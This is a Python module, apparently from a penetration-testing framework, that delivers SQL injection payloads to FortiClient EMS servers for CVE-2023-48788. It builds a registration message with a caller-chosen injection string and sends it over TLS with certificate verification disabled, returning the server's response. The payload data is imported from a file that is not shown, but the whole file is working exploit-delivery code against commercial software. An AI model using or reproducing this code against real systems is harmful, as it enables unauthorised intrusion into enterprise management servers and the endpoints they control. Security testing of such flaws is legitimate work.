#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""FortiClient EMS TLS registration probes (Horizon3 CVE-2023-48788)."""

from __future__ import annotations

import socket
import ssl

from core.framework.base_module import BaseModule
from core.framework.option import OptFloat

from lib.protocols.tcp._fcems_register_data import REGISTER_BODY, SQLI_PROBE


class Forticlient_ems_client(BaseModule):
    """Mixin: FortiClient EMS registration message over TLS."""

    ems_timeout = OptFloat(5.0, "FortiClient EMS TLS timeout (seconds)", required=False, advanced=True)

    def _ems_timeout(self) -> float:
        raw = getattr(self, "ems_timeout", None) or getattr(self, "timeout", None)
        if hasattr(raw, "value"):
            raw = raw.value
        return float(raw or 5.0)

    def build_forticlient_register_message(self, injection: str = SQLI_PROBE) -> bytes:
        msg_len = len(REGISTER_BODY + injection)
        return REGISTER_BODY.format(injection, msg_len).encode()

    def send_forticlient_register(
        self,
        host: str,
        port: int,
        injection: str = SQLI_PROBE,
        *,
        recv_size: int = 4096,
    ) -> bytes:
        msg = self.build_forticlient_register_message(injection)
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        raw = socket.create_connection((host, int(port)), timeout=self._ems_timeout())
        sock = context.wrap_socket(raw, server_hostname=host)
        try:
            sock.sendall(msg)
            return sock.recv(recv_size)
        finally:
            sock.close()
